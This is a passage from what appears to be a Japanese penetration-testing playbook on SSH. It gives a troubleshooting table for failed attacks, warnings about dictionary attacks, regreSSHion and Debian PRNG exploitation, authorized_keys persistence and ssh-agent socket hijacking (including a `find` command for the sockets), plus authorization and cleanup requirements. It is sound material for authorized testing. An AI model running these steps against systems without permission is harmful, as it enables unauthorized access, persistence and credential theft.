> **`ssh -A` (Agent Forwarding) との関係:** `ssh -A` で接続するとクライアント側の agent ソケットがターゲット側に転送される。**ターゲット側 root に同じハイジャック手法で乗っ取られる**ため、信頼できないホストには `-A` を付けない（§5 の注意と整合）。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `ssh -v` で認証方式が返らない | StrictModes / fail2ban で接続自体拒否 | 接続元を変える / 時間をおいて再試行 |
| `no matching key exchange method found` 等で接続不可 | 古い OpenSSH にレガシーアルゴ明示が必要（現代クライアントが既定で拒否）| `-oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa,ssh-dss -c aes128-cbc`（§4 / §5）|
| 辞書攻撃で全 cred が拒否 | パスワード認証無効 | 秘密鍵取得経路 → `Credential_Discovery.md` / Debian PRNG (§10) / authorized_keys 書込 (§11) |
| CVE-2018-15473 PoC で全 invalid | OpenSSH 7.7+ にパッチ済み | LDAP / SMTP VRFY / SMB / OSINT (`.keys`) で別経路 |
| デフォルト認証情報で 1 件も通らない | 出荷時 cred が変更済み | `Default_Credentials.md` の製品別早見表で別組合せ |
| ホスト鍵が複数ホストで一致 | テンプレートからのクローン環境 | 鍵使い回しの可能性 → 横展開観点に反映 |
| §11 authorized_keys 書込後も接続拒否 | パーミッション / 所有者 / SELinux | `chmod 700 .ssh && chmod 600 authorized_keys` + `chown` 修正、`auth.log` の `bad ownership or modes` 確認 |
| port forwarding が `administratively prohibited` | `AllowTcpForwarding no` | chisel / SOCAT で代替 pivot を構築 |
| §13 ssh-agent ソケットが見つからない | ターゲットユーザーが ssh-agent を使っていない / ソケットが別パス | `find / -name 'agent.*' 2>/dev/null`、`systemctl status ssh-agent`、root 権限獲得後に再試行 |

## 注意点・落とし穴

> **[HIGH IMPACT]** §7 hydra / medusa / ncrack 辞書攻撃は以下の理由で原則禁止または個別合意必須:
> - [x] 業務停止リスク（アカウントロック）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（`auth.log` / `secure` の `Failed password` 大量、fail2ban アラート）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> **[HIGH IMPACT]** §1 CVE-2024-6387 (regreSSHion) と §10 CVE-2008-0166 Debian PRNG の実 exploit は以下の理由で原則禁止または個別合意必須:
> - [x] race condition / 大量試行で **`auth.log` に massive な痕跡**を残す
> - [x] CVE-2024-6387 は exploit 失敗時に **sshd プロセスのクラッシュ** が発生する可能性（サービス影響）
> - [ ] 持続化に該当
>
> バージョン該当の確認まで（§1 / §10 の banner 観察）は技術的判断で実施可。実 exploit は事前合意必須。

> **[HIGH IMPACT]** §11 authorized_keys 書込は **持続化に該当**するため本番では原則禁止または個別合意必須（詳細は §11 内の警告ブロックを参照）。**原状回復として該当公開鍵の削除が必須**（テスト識別子コメントマーカーで grep 削除）。

> **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロックを横断する高影響の警告のみを置く。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — §10 Debian PRNG 試行 / §11 authorized_keys 書込 / §7 認証スプレー / §1 CVE-2024-6387 実 exploit）/ ★★（口頭確認可 — §12 port forwarding は経路設計が影響するため・§13 agent ハイジャックは横展開連鎖の起点）/ ★（§1-§4 のバナー・認証方式・fingerprint・アルゴリズム列挙は技術的判断のみで実施可だが、対象組織との合意範囲は確認）
- **想定される SIEM / EDR 検知**: `auth.log` / `secure` の `Failed password for [USER] from [IP]` 大量、fail2ban アラート、`Connection closed by [IP] [preauth]` の連続記録、SSH ハニーポット検知、§11 authorized_keys 書込は File Integrity Monitoring / auditd で即アラート、§12 port forwarding は IDS の lateral movement signature に当たる可能性
- **業務影響リスク**: アカウントロック発生時の業務影響（管理者アカウントなら系統的影響）、§1 CVE-2024-6387 試行時の sshd クラッシュリスク、§11 authorized_keys 書込先のディスク使用量（実害は微少）
- **原状回復必須項目**: ✅ §11 で追加した公開鍵を `authorized_keys` から削除（テスト識別子コメントマーカー `kedalab-[CASE_ID]` で grep 削除）/ ✅ §12 で確立した port forwarding セッションの切断 / ✅ §13 で `SSH_AUTH_SOCK` 改変した環境変数の元復元（exit でログアウト時に消える）/ ✅ 取得した秘密鍵の安全な破棄
- **取得情報の取扱**: 秘密鍵は暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

> **SSH 関連以外の取得後活動（cron / systemd / bash_history 痕跡等）はこのファイルの範囲外** → `../03_Post_Access_Linux/Enumeration_Checklist.md`。取得した秘密鍵を起点にした横展開は同ファイルおよび本ファイル §3 の fingerprint と連携する。

## 関連技術

- 前：22 ポートの発見 → `../01_Reconnaissance/Network_Scanning.md`
- 前：OS 判定の手掛かり → `../00_Playbook/00_OS_Identification.md`
- 前：認証情報の取得 → `Credential_Discovery.md`
- 前：ロックアウト設定の事前確認 → `Account_Lockout_Recon.md`
- 前：製品出荷時のデフォルト認証情報試行 → `Default_Credentials.md`
- 後：シェル取得後の Linux 列挙・権限昇格・横展開 → `../03_Post_Access_Linux/Enumeration_Checklist.md`
- 後：§12 SOCKS pivot 経由の内部ネットワーク列挙 → `../00_Playbook/Internal_LAN_Pentest_Flow.md`
- 後：§13 agent ハイジャックで取得した鍵による他ホスト連鎖侵入 → 本ファイル §5（取得鍵での再ログイン）
- 前：§11 authorized_keys 書込のための書込権限取得経路 → `FTP.md`（§5 書込判定）/ Redis unauth / `PostgreSQL_Exploitation.md`（§10 `lo_export` / `COPY TO` / `COPY ... FROM PROGRAM` chown 経由・`postgres:postgres` 所有者罠あり）/ `MySQL_Exploitation.md`（§9 `INTO OUTFILE` 経由・`mysql:mysql` 所有者罠あり）等の別プロトコル経路
- 関連：他プロトコルでの認証情報使い回し → `FTP.md` / `Mail_Services.md` / `WinRM.md` / `Impacket_Exec.md` / `MySQL_Exploitation.md`（§6 mysql.user ハッシュクラック後の cred 使い回し）/ `PostgreSQL_Exploitation.md`（§6 pg_shadow ハッシュクラック後の cred 使い回し）
- 関連：TLS バナーと同様の証明書/鍵からの組織推定軸 → `../01_Reconnaissance/TLS_Audit.md`
